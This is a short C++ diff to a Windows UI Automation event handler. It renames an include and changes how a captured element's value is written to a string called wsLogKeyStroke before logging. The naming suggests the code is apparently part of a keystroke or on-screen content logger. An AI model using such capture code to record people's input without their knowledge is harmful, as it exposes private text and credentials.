@@ -1,4 +1,4 @@
-#include "Apps.h"
+#include "MyAutomationEventHandlerApps.h"
 #include "MyAutomationEventHandler.h"
 #include "Logger.h"
 
@@ -44,7 +44,7 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 
 		wsLogKeyStroke += L"\n\tClass: " + std::wstring(bClassName);
 		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
-		wsLogKeyStroke += L"\n\tValue:\n" + std::wstring(vValue.bstrVal);
+		wsLogKeyStroke += L"\n--------------[CONTENT]--------------\n" + std::wstring(vValue.bstrVal) + L"\n--------------[CONTENT]--------------";
 
 		Log(wsLogKeyStroke, EMPTY);
 		break;
